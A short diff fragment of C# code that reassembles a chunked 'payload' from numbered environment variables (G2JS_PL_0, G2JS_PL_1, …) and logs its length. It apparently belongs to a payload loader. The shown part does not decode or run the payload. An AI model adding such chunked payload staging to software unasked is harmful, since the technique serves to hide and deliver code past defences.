@@ -1,0 +1,27 @@
+            // 1. Reassemble Payload from Environment Variables
+            Log("Reading environment variables...");
+            StringBuilder payloadBuilder = new StringBuilder();
+            int index = 0;
+            
+            while (true)
+            {
+                string envVarName = "G2JS_PL_" + index;
+                string chunk = Environment.GetEnvironmentVariable(envVarName, EnvironmentVariableTarget.Process);
+
+                if (string.IsNullOrEmpty(chunk))
+                {
+                    break;
+                }
+
+                payloadBuilder.Append(chunk);
+                index++;
+            }
+
+            string fullPayloadStr = payloadBuilder.ToString();
+            Log("Payload retrieved. Length: " + fullPayloadStr.Length);
+
+            if (string.IsNullOrEmpty(fullPayloadStr))
+            {
+                Log("Error: Payload is empty.");
+                return; 
+            }
